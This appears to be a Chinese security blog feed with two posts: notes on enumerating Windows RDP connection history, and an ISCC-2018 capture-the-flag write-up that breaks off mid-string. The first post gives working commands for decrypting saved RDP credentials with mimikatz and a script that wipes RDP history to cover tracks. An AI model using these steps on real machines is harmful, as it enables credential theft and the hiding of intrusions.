    <content type="html"><![CDATA[<p>关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次成功连接到远程主机时，RDP客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动<code>mstsc.exe</code>时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。</p><p>从安全角度来讲，这是极不安全的。</p><h2 id="0x01-获取RDP连接历史记录"><a href="#0x01-获取RDP连接历史记录" class="headerlink" title="0x01 获取RDP连接历史记录"></a>0x01 获取RDP连接历史记录</h2><p>至于获得历史记录的思路及细节实现思路，请转至<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">三好学生</a>师傅的博客，此处仅作为记录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">This script will list the logged-in users' RDP Connections History.</span></span><br><span class="line"><span class="comment">Author: 3gstudent@3gstudent</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$AllUser</span> = <span class="built_in">Get-WmiObject</span> -Class Win32_UserAccount</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$User</span> <span class="keyword">in</span> <span class="variable">$AllUser</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$RegPath</span> = <span class="string">"Registry::HKEY_USERS\"</span>+<span class="variable">$User</span>.SID+<span class="string">"\Software\Microsoft\Terminal Server Client\Servers\"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span>.Name</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"SID:"</span><span class="variable">$User</span>.SID</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"Status:"</span><span class="variable">$User</span>.Status</span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123; </span><br><span class="line"><span class="variable">$QueryPath</span> = dir <span class="variable">$RegPath</span> -Name -ErrorAction Stop</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">Catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Name</span> <span class="keyword">in</span> <span class="variable">$QueryPath</span>)</span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="variable">$User</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="variable">$RegPath</span><span class="variable">$Name</span> -ErrorAction Stop).UsernameHint</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"Server:"</span><span class="variable">$Name</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Catch</span>  </span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据三好学生师傅的PowerShell改写了C#版本，虽然代码不怎么好看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using Microsoft.Win32;</span><br><span class="line"></span><br><span class="line">namespace SavedRDPConnections</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        public static string GetRegValue(string hive, string path, string value)</span><br><span class="line">        &#123;</span><br><span class="line">            string regKeyValue = &quot;&quot;;</span><br><span class="line">            if (hive == &quot;HKCU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (hive == &quot;HKU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static string[] GetRegSubkeys(string hive, string path)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                Microsoft.Win32.RegistryKey myKey = null;</span><br><span class="line">                if (hive == &quot;HKLM&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else if (hive == &quot;HKU&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                String[] subkeyNames = myKey.GetSubKeyNames();</span><br><span class="line">                return myKey.GetSubKeyNames();</span><br><span class="line">            &#125;</span><br><span class="line">            catch</span><br><span class="line">            &#123;</span><br><span class="line">                return new string[0];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void ListSavedRDPConnections()</span><br><span class="line">        &#123;</span><br><span class="line">            string[] SIDs = Registry.Users.GetSubKeyNames();</span><br><span class="line">            foreach (string SID in SIDs)</span><br><span class="line">            &#123;</span><br><span class="line">                if (SID.StartsWith(&quot;S-1-5&quot;) &amp;&amp; !SID.EndsWith(&quot;_Classes&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    string[] subkeys = GetRegSubkeys(&quot;HKU&quot;, String.Format(&quot;&#123;0&#125;\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;, SID));</span><br><span class="line">                    if (subkeys != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;\r\n\r\n=== Saved RDP Connection Information (&#123;0&#125;) ===&quot;, SID);</span><br><span class="line">                        foreach (string host in subkeys)</span><br><span class="line">                        &#123;</span><br><span class="line">                            string username = GetRegValue(&quot;HKCU&quot;, String.Format(&quot;Software\\Microsoft\\Terminal Server Client\\Servers\\&#123;0&#125;&quot;, host), &quot;UsernameHint&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;\r\n  Server : &#123;0&#125;&quot;, host);</span><br><span class="line">                            if (username != &quot;&quot;)</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(&quot;  User   : &#123;0&#125;&quot;, username);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            ListSavedRDPConnections();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/image/关于windows的RDP连接记录/blog_2018-11-30_18-25-46.png" alt=""></p><h2 id="0x02-破解RDP连接凭证"><a href="#0x02-破解RDP连接凭证" class="headerlink" title="0x02 破解RDP连接凭证"></a>0x02 破解RDP连接凭证</h2><p>破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。</p><p><img src="/image/关于windows的RDP连接记录/1.png" alt=""></p><h3 id="1、查找本地的Credentials"><a href="#1、查找本地的Credentials" class="headerlink" title="1、查找本地的Credentials"></a>1、查找本地的Credentials</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a <span class="variable">%userprofile%</span><span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\*</span></span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/2.png" alt=""></p><h3 id="2、使用mimikatz进行操作"><a href="#2、使用mimikatz进行操作" class="headerlink" title="2、使用mimikatz进行操作"></a>2、使用mimikatz进行操作</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>llen<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\A</span>B07963F1A0A1CB56827E93395597FC6</span><br></pre></td></tr></table></figure><p>得到的内容为：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # dpapi::cred /<span class="keyword">in</span>:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6</span><br><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;<span class="type">df9d8cd0</span>-<span class="number">1501</span>-<span class="number">11</span>d1-<span class="number">8</span>c7a-<span class="number">00</span>c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;<span class="type">ffc994a1</span>-de8d-<span class="number">4304</span>-<span class="number">9416</span>-<span class="number">31e587</span>f7a8ca&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (<span class="type">system</span> ; )</span><br><span class="line">  dwDescriptionLen   : 00000030 - 48</span><br><span class="line">  szDescription      : <span class="type">Local</span> Credential Data</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (<span class="type">CALG_AES_256</span>)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : 00<span class="type">fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb</span></span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         :</span><br><span class="line">  algHash            : 0000800<span class="type">e</span> - <span class="number">32782</span> (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : <span class="type">b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530</span></span><br><span class="line">  dwDataLen          : 000000<span class="type">b0</span> - <span class="number">176</span></span><br><span class="line">  pbData             : 4083<span class="type">f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a</span></span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 7<span class="type">c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8</span></span><br></pre></td></tr></table></figure><p>接下来需要使用的就是<code>guidMasterKey</code>、<code>pbData</code>数据。<strong>pbData是凭据的加密数据，guidMasterKey是凭据的GUID</strong></p><h3 id="3、使用sekurlsa-dpapi"><a href="#3、使用sekurlsa-dpapi" class="headerlink" title="3、使用sekurlsa::dpapi"></a>3、使用sekurlsa::dpapi</h3><p><img src="/image/关于windows的RDP连接记录/3.png" alt=""></p><p>根据目标凭据<code>GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}</code>找到其关联的<code>MasterKey</code>，这个<code>MasterKey</code>就是加密凭据的密钥，即<code>解密pbData</code>所必须的东西。</p><h3 id="4、解密"><a href="#4、解密" class="headerlink" title="4、解密"></a>4、解密</h3><p>命令为：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>llen<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\A</span>B07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c</span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/4.png" alt=""></p><h2 id="0x03-清除RDP连接历史记录"><a href="#0x03-清除RDP连接历史记录" class="headerlink" title="0x03 清除RDP连接历史记录"></a>0x03 清除RDP连接历史记录</h2><p>清除就相对简单一些。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Microsoft\Terminal<span class="built_in"> Server </span>Client\</span><br></pre></td></tr></table></figure><p>针对上述的<code>Default</code>、<code>Server</code>，对其表项进行删除</p><p><img src="/image/关于windows的RDP连接记录/5.png" alt=""></p><p>tips：由于在删除<code>Server表项</code>的时候无法一次选择所有表项，因为可以直接删除<code>整个Server</code>再新建。</p><p>除了删除注册表之外，要需要删除默认的RDP连接文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>erminal Server Client<span class="symbol">\D</span>efault" /va /f # 删除Default中的所有值</span><br><span class="line">reg delete "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>erminal Server Client<span class="symbol">\S</span>ervers" /f # 删除整个Servers</span><br><span class="line">reg add "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>erminal Server Client<span class="symbol">\S</span>ervers" 重新创建删除的注册表项</span><br><span class="line">cd <span class="variable">%userprofile%</span><span class="symbol">\d</span>ocuments<span class="symbol">\ </span># 转到Default.rdp文件目录</span><br><span class="line">attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏</span><br><span class="line">del Default.rdp  # 删除文件Default.rdp文件</span><br></pre></td></tr></table></figure><p>注意：在某些情况（比如系统盘空间不足）下，<code>Document</code>文件夹会从<code>%userprofile%\documents\</code>移动，所以特殊情况下，需要手动查找<code>Default.rdp</code></p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">获得Windows系统的远程桌面连接历史记录</a></p><p><a href="http://www.ansbase5.info/?p=535" target="_blank" rel="noopener">mimikatz获取本地Credentials</a></p><p><a href="https://www.t00ls.net/articles-41926.html#" target="_blank" rel="noopener">破解远程终端凭据，获取服务器密码</a></p><p><a href="http://woshub.com/how-to-clear-rdp-connections-history/#h2_3" target="_blank" rel="noopener">How to Clear RDP Connections History in Windows</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ISCC-2018</title>
    <link href="https://rcoil.me/2018/05/ISCC-2018/"/>
    <id>https://rcoil.me/2018/05/ISCC-2018/</id>
    <published>2018-05-01T13:11:29.000Z</published>
    <updated>2018-05-25T15:04:13.658Z</updated>
    
    <content type="html"><![CDATA[<p>又一年，不过今年的质量有些…..</p><a id="more"></a><h2 id="0x01Misc"><a href="#0x01Misc" class="headerlink" title="0x01Misc"></a>0x01Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>附件地址：<a href="https://pan.baidu.com/s/1RFKBXgMtT4uF-MZ5gDQf9w" target="_blank" rel="noopener">What is that</a></p><p>查看图片信息，使用传统的方法解答没见效，使用<code>TweakPNG</code>查看图片信息。</p><p><img src="/image/ISCC-2018/MISC1-1.png" alt=""></p><p>将高度调整即可得到flag。</p><p><img src="/image/ISCC-2018/MISC1.png" alt=""></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>查看附件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">秘密电报：</span><br><span class="line">知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</span><br></pre></td></tr></table></figure><p>老司机一看就是培根密码了，flag为：<code>ILIKEISCC</code></p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>附件地址：<a href="https://pan.baidu.com/s/18ABDPnRwb0TrRezILokaQQ" target="_blank" rel="noopener">Where is the FLAG</a></p><p>题目：不只是Logo</p><p>查看详细信息，发现是由<code>Adobe Fireworks CS5</code>保存出来的图片，那就用<code>Adobe Fireworks CS5</code>打开。</p><p><img src="/image/ISCC-2018/MISC3.png" alt=""></p><p>调整画布大小，开始摆，得出一张二维码。<code>flag{a332b700-3621-11e7-a53b-6807154a58cf}</code></p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>附件地址：<a href="https://pan.baidu.com/s/1j2P-dyMOjONc7fFZrI2PFA" target="_blank" rel="noopener">一只猫的心思</a></p><p>题目：你能读懂它的心思吗？</p><p>使用<code>foremost</code>抽离图片，得到一个doc文件，打开，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密，得到一串16进制字符串，接下来：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span>进制--&gt;文本--&gt;<span class="function"><span class="title">base64</span>解密--&gt;</span><span class="function"><span class="title">base32</span>解密--&gt;</span>文本--&gt;<span class="function"><span class="title">base64</span>解密--&gt;</span><span class="function"><span class="title">base32</span>解密--&gt;</span>文本</span><br></pre></td></tr></table></figure><p>得到<code>F1a9_is_I5cc_ZOl8_G3TP01NT</code></p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>附件地址：<a href="https://pan.baidu.com/s/1TB3VVjeqYuNd4khsPHgntQ" target="_blank" rel="noopener">暴力XX不可取</a></p><p>题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</p><p>下载附件直接能解压，flag.txt的内容为<code>vfppjrnerpbzvat</code>，凯撒解密得出flag为：<code>isccwearecoming</code></p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q